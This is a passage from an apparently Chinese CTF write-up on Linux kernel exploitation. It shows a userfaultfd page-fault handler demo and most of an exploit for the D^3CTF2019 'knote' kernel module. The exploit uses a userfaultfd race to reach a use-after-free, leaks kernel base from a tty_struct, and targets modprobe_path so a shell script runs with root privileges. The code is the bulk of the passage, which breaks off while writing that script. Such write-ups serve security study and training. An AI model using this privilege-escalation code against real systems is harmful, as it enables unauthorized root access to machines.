class="string">&quot;[-] Error at: mmap&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] mmap addr: %p\n&quot;</span>, page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//循环处理缺页错误</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">//poll 函数等待 userfaultfd 的事件</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//poll 函数返回的结果</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nfault_handler_thread():&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; POLLIN = %d; POLLERR = %d\n&quot;</span>,</span><br><span class="line">               nready, (pollfd.revents &amp; POLLIN) != <span class="number">0</span>, (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从 userfaultfd 读取事件</span></span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//userfaultfd 的事件应当是缺页错误事件</span></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//userfaultfd 返回的缺页错误相关信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flags = 0x%llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;address = 0x%llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用户自定义的处理缺页错误的部分</span></span><br><span class="line">        <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">        fault_cnt++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将内容复制到目标位置，注意页对齐</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>, uffdio_copy.copy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//获取内存页长度</span></span><br><span class="line">    page_size = (<span class="type">int</span>) sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] page size: 0x%x\n&quot;</span>, page_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//系统调用创建 userfaultfd</span></span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置 userfaultfd 调用接口</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mmap 映射一块虚拟内存</span></span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error at: mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mmap addr: 0x%lx\n&quot;</span>, (<span class="type">size_t</span>) addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在创建的 userfaultfd 上注册一块内存，注册的内存区域覆盖刚才 mmap 映射的虚拟内存</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = page_size;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个线程处理注册的内存区域发生的缺页中断</span></span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//访问 mmap 映射的虚拟内存触发缺页中断</span></span><br><span class="line">    <span class="type">size_t</span> ptr = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *) addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Get data: 0x%lx\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
运行结果如图，自定义的缺页处理函数向缺页处写入了数据。<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bbcd54e06b7635e0c2d0e11e9ab79e03.png"
                     
alt="在这里插入图片描述" 
                > <strong>需要说明的是，自从 5.11 版本起内核
<code>fs/userfaultfd.c</code> 中全局变量
<code>sysctl_unprivileged_userfaultfd</code> 初始化为 1，这意味着只有
root 权限用户才能使用 userfaultfd 。</strong></p>
<p>不过还有用户空间文件系统（filesystem in userspace，FUSE）可以被用作
userfaultfd
的替代品，帮助我们完成条件竞争的利用。只不过这种方式对环境要求较高，CTF
题目中的环境通常不支持这种利用方式。 ### 例题：D^3CTF2019 - knote</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/D%5E3CTF2019_knote" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
有 add，dele，edit，get 4种功能，ioctl 不能调用超过 9 次。其中 edit 和
get 没有加锁。 首先是内核地址泄露。利用 userfaultfd
制造将获取数据的内存块替换成
<code>tty_struct</code>，然后从其中的数据获取内核基地址。</p>
<p>第二次同理，利用 userfaultfd 构造 UAF 劫持 freelist 修改
<code>modprobe_path</code> 使得修改 flag 文件权限的 shell
脚本以管理员权限执行。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/beac149a206ba0e8fcf2e6c074cc0bd8.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> TTY_STRUCT_SIZE = <span class="number">0x2C0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> DO_SAK_WORK = <span class="number">0xffffffff815d4ef0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> MODPROBE_PATH = <span class="number">0xffffffff8245c5c0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *page;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api=UFFD_API, .features=<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125; Chunk;</span><br><span class="line"><span class="type">long</span> knote_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_add</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.size=size&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x1337</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_edit</span><span class="params">(<span class="type">size_t</span> index, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index, .buf=buf&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x8888</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_get</span><span class="params">(<span class="type">size_t</span> index, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index, .buf=buf&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x2333</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_del</span><span class="params">(<span class="type">size_t</span> index)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x6666</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    page_size = getpagesize();</span><br><span class="line">    <span class="type">char</span> *buf1 = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *buf2 = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(buf1, <span class="number">0x1000</span>, (<span class="type">void</span> *) fault_handler_thread);</span><br><span class="line">    register_userfaultfd(buf2, <span class="number">0x1000</span>, (<span class="type">void</span> *) fault_handler_thread);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span> *kernel_base = (<span class="type">void</span> *) <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line">    FILE *addr_fp = fopen(<span class="string">&quot;/addr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    knote_fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (addr_fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(addr_fp, <span class="string">&quot;%llx %llx&quot;</span>, &amp;kernel_base, &amp;kernel_offset);</span><br><span class="line">        fclose(addr_fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        chunk_add(TTY_STRUCT_SIZE);</span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] FAILED to fork the child&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Child process sleeping now...&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Child process started.&quot;</span>);</span><br><span class="line">            chunk_del(<span class="number">0</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Object free and tty got open. Backing parent thread...&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Parent process trapped in userfaultfd...&quot;</span>);</span><br><span class="line">            chunk_get(<span class="number">0</span>, buf1);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] tty struct data obtained&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        qword_dump(<span class="string">&quot;leak tty_struct&quot;</span>, buf1, TTY_STRUCT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (is_kernel_text_addr(((<span class="type">size_t</span> *) buf1)[<span class="number">86</span>])) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully hit the tty_struct.&quot;</span>);</span><br><span class="line">            kernel_offset = ((<span class="type">size_t</span> *) buf1)[<span class="number">86</span>] - DO_SAK_WORK;</span><br><span class="line">            kernel_base = (<span class="type">void</span> *) ((<span class="type">size_t</span>) kernel_base + kernel_offset);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to hit the tty struct.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr_fp = fopen(<span class="string">&quot;/addr.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(addr_fp, <span class="string">&quot;%llx %llx&quot;</span>, kernel_base, kernel_offset);</span><br><span class="line">        fclose(addr_fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> modprobe_path = MODPROBE_PATH + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path: %p\n&quot;</span>, modprobe_path);</span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; 